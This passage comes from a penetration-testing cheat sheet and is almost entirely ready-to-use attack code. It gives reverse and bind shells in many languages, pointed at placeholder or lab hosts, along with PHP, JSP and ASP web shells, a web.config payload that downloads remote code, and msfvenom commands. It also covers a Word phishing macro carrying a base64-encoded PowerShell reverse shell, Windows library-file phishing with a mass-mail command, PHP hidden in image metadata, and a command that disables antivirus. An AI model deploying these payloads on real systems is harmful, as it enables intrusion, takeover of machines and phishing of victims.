# powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
# for disable antivirus to run reverse shell --> Set-MpPreference -DisableRealtimeMonitoring $true
# from our device $ nc -lvnp 1234
# Ref:- https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/
```

```cmd
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1'); powercat -c <LHOST> -p <LPORT> -e powershell"
```

#### Bash Reverse Shell

```shell
bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
echo -n '/bin/bash -c "bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"' | base64
```

#### curl Reverse Shell

```shell
curl --header "Content-Type: application/json" --request POST http://<RHOST>:<RPORT>/upload --data '{"auth": {"name": "<USERNAME>", "password": "<PASSWORD>"}, "filename" : "& echo "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"|base64 -d|bash"}'
```

#### Groovy (Jenkins) Reverse Shell

```shell
String host="<LHOST>";
int port=<LPORT>;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

#### JAVA Reverse Shell

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<LHOST>/<LPORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<LHOST>/<LPORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor();
```

#### shell.jar

```java
package <NAME>;

import org.bukkit.plugin.java.JavaPlugin;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;

public class Main extends JavaPlugin {
   @Override
   public void onDisable() {
     super.onDisable();
   }

@Override
public void onEnable() {
  final String PHP_CODE = "<?php system($_GET['cmd']); ?>";
  try {
   Files.write(Paths.get("/var/www/<RHOST>/shell.php"), PHP_CODE.getBytes(), StandardOpenOption.CREATE_NEW);
   } catch (IOException e) {
     e.printStackTrace();
   }

   super.onEnable();
  }
}
```

#### Lua Reverse Shell

```shell
http://<RHOST>');os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT>/tmp/f")--
```

#### Markdown Reverse Shell

```shell
--';bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1;'--
```

#### mkfifo Reverse Shell

```shell
mkfifo /tmp/shell; nc <LHOST> <LPORT> 0</tmp/shell | /bin/sh >/tmp/shell 2>&1; rm /tmp/shell
```

#### Netcat Reverse Shell

```shell
nc -e /bin/sh <LHOST> <LPORT>
```

#### Perl Reverse Shell

```shell
perl -e 'use Socket;$i="<LHOST>";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

#### PHP Reverse Shell

```shell
php -r '$sock=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

#### PowerShell Reverse Shell

```shell
$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```shell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```shell
powershell -nop -exec bypass -c '$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
```

#### minireverse.ps1

```shell
$socket = new-object System.Net.Sockets.TcpClient('127.0.0.1', 413);
if($socket -eq $null){exit 1}
$stream = $socket.GetStream();
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 1024;
$encoding = new-object System.Text.AsciiEncoding;
do
{
	$writer.Flush();
	$read = $null;
	$res = ""
	while($stream.DataAvailable -or $read -eq $null) {
		$read = $stream.Read($buffer, 0, 1024)
	}
	$out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
	if(!$out.equals("exit")){
		$args = "";
		if($out.IndexOf(' ') -gt -1){
			$args = $out.substring($out.IndexOf(' ')+1);
			$out = $out.substring(0,$out.IndexOf(' '));
			if($args.split(' ').length -gt 1){
                $pinfo = New-Object System.Diagnostics.ProcessStartInfo
                $pinfo.FileName = "cmd.exe"
                $pinfo.RedirectStandardError = $true
                $pinfo.RedirectStandardOutput = $true
                $pinfo.UseShellExecute = $false
                $pinfo.Arguments = "/c $out $args"
                $p = New-Object System.Diagnostics.Process
                $p.StartInfo = $pinfo
                $p.Start() | Out-Null
                $p.WaitForExit()
                $stdout = $p.StandardOutput.ReadToEnd()
                $stderr = $p.StandardError.ReadToEnd()
                if ($p.ExitCode -ne 0) {
                    $res = $stderr
                } else {
                    $res = $stdout
                }
			}
			else{
				$res = (&"$out" "$args") | out-string;
			}
		}
		else{
			$res = (&"$out") | out-string;
		}
		if($res -ne $null){
        $writer.WriteLine($res)
    }
	}
}While (!$out.equals("exit"))
$writer.close();
$socket.close();
$stream.Dispose()
```

#### Python Reverse Shell

```shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```shell
python -c 'import pty,subprocess,os,time;(master,slave)=pty.openpty();p=subprocess.Popen(["/bin/su","-c","id","bynarr"],stdin=slave,stdout=slave,stderr=slave);os.read(master,1024);os.write(master,"fruity\n");time.sleep(0.1);print os.read(master,1024);'
```

```shell
echo python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > <FILE><(),2);p=subprocess.call(["/bin/sh","-i"]);' > <FILE>
```

#### Ruby Reverse Shell

```shell
ruby -rsocket -e'f=TCPSocket.open("<LHOST>",<LPORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

https://www.revshells.com/

***escape quotes if running from command line*** (ex., ((\"192.168.49.232\",80)))
```bash
# Linux
bash -i >& /dev/tcp/10.11.1.111/4443 0>&1
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.1.111 4443 >/tmp/f
nc -e /bin/sh 10.11.1.111 4443

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.1.111",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.9 4433 >/tmp/f')-1\

# Perl
perl -e 'use Socket;$i="10.11.1.111";$p=4443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Windows
nc -e cmd.exe 10.11.1.111 4443
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.11',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# The below drops into a cmd.exe shell [ $ps -> into PowerShell / $ps=$false -> to go back to cmd.exe]:
powershell -NoP -NonI -W Hidden -Exec Bypass "& {$ps=$false;$hostip='192.168.49.74';$port=445;$client = New-Object System.Net.Sockets.TCPClient($hostip,$port);$stream = $client.GetStream();[byte[]]$bytes = 0..50000|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$cmd=(get-childitem Env:ComSpec).value;$inArray=$data.split();$item=$inArray[0];if(($item -eq '$ps') -and ($ps -eq $false)){$ps=$true}if($item -like '?:'){$item='d:'}$myArray=@('cd','exit','d:','pwd' ,'ls','ps','rm','cp','mv','cat');$do=$false;foreach ($i in $myArray){if($item -eq $i){$do=$true}}if($do -or $ps){$sendback=( iex $data 2>&1 |Out-String)}else{$data2='/c '+$data;$sendback = ( &$cmd $data2 2>&1 | Out-String)};if($ps){$prompt='PS ' + (pwd).Path}else{$prompt=(pwd).Path}$sendback2 = $data + $sendback + $prompt + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"

# PHP most simple Linux
<?php $sock = fsockopen("10.11.1.111",1234); $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);?>
```

### Bind Shell

```
# V> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
# OR
# V> rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
# A> nc -nv 10.129.41.200 7777
# python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
# powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
# from our device, we will try to access the target machine through $nc 10.10.10.1 1234
# Ref:- https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/
```

### Web Shell

```
# php --> <?php system($_REQUEST["cmd"]); ?>
# php --> echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
# jsp --> <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
# asp --> <% eval request("cmd") %>
```

#### PHP Web Shell

```php
<?php system($_GET['cmd']); ?>
<?php echo exec($_POST['cmd']); ?>
<?php echo passthru($_GET['cmd']); ?>
<?php passthru($_REQUEST['cmd']); ?>
<?php echo system($_REQUEST['shell']): ?>
```

```shell
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Set s = CreateObject("WScript.Shell")
Set cmd = s.Exec("cmd /c powershell -c IEX (New-Object Net.Webclient).downloadstring('http://<LHOST>/shellyjelly.ps1')")
o = cmd.StdOut.Readall()
Response.write(o)
%>
-->
```

### TTY Upgrade

Spawn a fully interactive TTY from a limited shell.

```bash
# Python
python3 -c 'import pty; pty.spawn("/bin/bash")'
python  -c 'import pty; pty.spawn("/bin/bash")'

# Direct shell
/bin/sh -i

# Interpreters
perl -e 'exec "/bin/sh";'
ruby -e 'exec "/bin/sh"'
lua -e 'os.execute("/bin/sh")'
awk 'BEGIN {system("/bin/sh")}'

# File-based execution
find / -name <filename> -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
find . -exec /bin/sh \; -quit
```

Vim escape:

```vim
:set shell=/bin/sh
:shell
```

### Payloads, MSFvenom & Web Shells

Payload types:

- **Single** — self-contained (e.g., `windows/shell_reverse_tcp`).
- **Stager + stage** — small stager downloads the main payload (e.g., `windows/meterpreter/reverse_tcp`).
- **Bind vs reverse** — bind listens on the target; reverse connects back to the attack host.
- **Inline vs staged** — inline embeds the payload; staged fetches it.

MSFvenom examples:

```bash
msfvenom -l payloads

# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=443 -f elf > shell.elf

# Windows EXE
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=443 -f exe > update.exe

# PHP / ASPX / WAR
msfvenom -p php/reverse_php LHOST=<ATTACKER_IP> LPORT=443 -f raw > shell.php
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=443 -f aspx > shell.aspx
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=443 -f war > shell.war
```

Listener:

```text
msf6 > use multi/handler
msf6 > set payload windows/shell_reverse_tcp
msf6 > set LHOST <ATTACKER_IP>
msf6 > set LPORT 443
msf6 > run
```

Web shells:

```bash
# Laudanum (ASPX example)
cp /usr/share/laudanum/aspx/shell.aspx ./demo.aspx

# Antak (Nishang)
cp /usr/share/nishang/Antak-WebShell/antak.aspx ./Upload.aspx
```

```php
<?php system($_REQUEST['cmd']); ?>
```

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

```asp
<% eval request("cmd") %>
```

Detection and prevention:

- AV/EDR signatures, AMSI, and script-block logging.
- Web shells in upload directories, unusual child processes of web servers, and outbound connections from web services.
- Disable dangerous functions, restrict upload directories, and monitor file integrity.

### Penelope

```shell
F12            // Detach shell and go to Main Menu
i <SESSION>    // Interact with a session
```

```shell
┍┽ penelope ┾┑ > run peass_ng		                             // Run the latest version of PEASS-ng in the background
┍┽ penelope ┾┑ > run lse		                             // Run the latest version of linux-smart-enumeration in the background
┍┽ penelope ┾┑ > run meterpreter	                             // Get a meterpreter shell
┍┽ penelope ┾┑ > download /etc		                             // Download the remote /etc folder
┍┽ penelope ┾┑ > upload https://www.exploit-db.com/exploits/40847    // Upload an exploit to the remote machine
┍┽ penelope ┾┑ > upload <FOLDER>			             // Upload a local folder to the remote machine
```

### pwncat

```shell
(local) pwncat$ back    // get back to shell
Ctrl+d                  // get back to pwncat shell
```

```shell
pwncat-cs -lp <LPORT>
(local) pwncat$ download /PATH/TO/FILE/<FILE> .
(local) pwncat$ upload /PATH/TO/FILE/<FILE> /PATH/TO/FILE/<FILE>
```

### Microsoft Office Word Phishing Macro

#### Payload

```cmd
IEX(New-Object System.Net.WebClient).DownloadString("http://<LHOST>/powercat.ps1"); powercat -c <LHOST> -p <LPORT> -e powershell
```

```cmd
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1'); powercat -c <LHOST> -p <LPORT> -e powershell"
```

```cmd
$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

#### Encoding

> https://www.base64decode.org/

Now `Base64 encode` it with `UTF-16LE` and `LF (Unix)`.

```shell
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANwAxACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

#### Alternatively using pwsh

#### Python Script for Formatting

```shell
str = "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANwAxACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="

n = 50

for i in range(0, len(str), n):
    print("Str = Str + " + '"' + str[i:i+n] + '"')
```

```shell
python3 script.py
Str = Str + "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4Ad"
Str = Str + "AAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdAB"
Str = Str + "lAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDA"
Str = Str + "GwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADE"
Str = Str + "ANwAxACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAP"
Str = Str + "QAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQA"
Str = Str + "oACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9A"
Str = Str + "CAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGw"
Str = Str + "AZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAY"
Str = Str + "QBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQB"
Str = Str + "zAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7A"
Str = Str + "CQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQ"
Str = Str + "AIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AV"
Str = Str + "ABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQA"
Str = Str + "uAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwA"
Str = Str + "CwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACg"
Str = Str + "AaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8Ad"
Str = Str + "QB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQB"
Str = Str + "jAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiA"
Str = Str + "FAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACs"
Str = Str + "AIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAK"
Str = Str + "ABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQB"
Str = Str + "TAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuA"
Str = Str + "GQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGk"
Str = Str + "AdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAb"
Str = Str + "gBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgB"
Str = Str + "lAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuA"
Str = Str + "HQALgBDAGwAbwBzAGUAKAApAA=="
```

#### Final Macro

```shell
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()

Sub MyMacro()
    Dim Str As String

    CreateObject("Wscript.Shell").Run Str
```

### Microsoft Windows Library Files

#### Installation of wsgidav

```shell
pip install wsgidav
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /PATH/TO/DIRECTORY/webdav/
```

#### config.Library-ms

```shell
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://<LHOST></url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

Put the `config.Library-ms` file in the `webdav` folder.

#### Shortcut File

Right-click on Windows to create a new `shortcut file`.

Put the `shortcut file (*.lnk)` into the `webdav` folder.

#### Send Phishing Email

```shell
swaks --server <RHOST> -t <EMAIL> -t <EMAIL> --from <EMAIL> --header "Subject: Staging Script" --body <FILE>.txt --attach @<FILE> --suppress-data -ap
```

#### PHP into JPG Injection

```shell
exiftool -Comment='<?php passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f"); ?>' shell.jpg
exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' <FILE>.jpeg
exiftool "-comment<=back.php" back.png
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' <FILE>.png
```

### Bad YAML

```yaml
- hosts: localhost
  tasks:
    - name: badyml
      command: chmod +s /bin/bash
```

### Payload References

| Payload Box | https://github.com/payloadbox |
| phpgcc | https://github.com/ambionics/phpggc |
| PHP-Reverse-Shell | https://github.com/ivan-sincek/php-reverse-shell|
| webshell | https://github.com/tennc/webshell |
| Web-Shells | https://github.com/TheBinitGhimire/Web-Shells |

## 7. Password Attacks

### Password Mutations

```
# Uses cewl to generate a wordlist based on keywords present on a website.
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist

# Uses Hashcat to generate a rule-based word list.
hashcat --force password.list -r custom.rule --stdout > mut_password.list

# Users username-anarchy tool in conjunction with a pre-made list of first and last names to generate a list of potential username.
